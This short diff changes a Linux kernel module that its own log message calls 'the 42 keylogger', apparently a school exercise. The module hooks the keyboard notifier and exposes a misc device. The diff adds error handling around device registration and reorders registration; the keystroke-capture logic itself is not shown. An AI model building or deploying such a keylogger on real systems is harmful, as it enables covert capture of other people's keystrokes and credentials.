@@ -26,7 +26,7 @@ static const struct file_operations fops = {
 	.read = my_read,
 };
 
-static const struct miscdevice device = {
+static struct miscdevice device = {
 	.minor = MISC_DYNAMIC_MINOR,
 	.name = "ft_keyboard",
 	.fops = &fops,
@@ -59,9 +59,15 @@ static struct notifier_block	keyboard_nb = {
 
 static int __init dni_init(void)
 {
+	int	ret;
+
 	pr_info("hi from the 42 keylogger\n");
+	ret = misc_register(&device);
+	if (ret) {
+		pr_err("Failed to register misc device\n");
+		return ret;
+	}
 	register_keyboard_notifier(&keyboard_nb);
-	misc_register(&device);
 	return 0;
 }
 
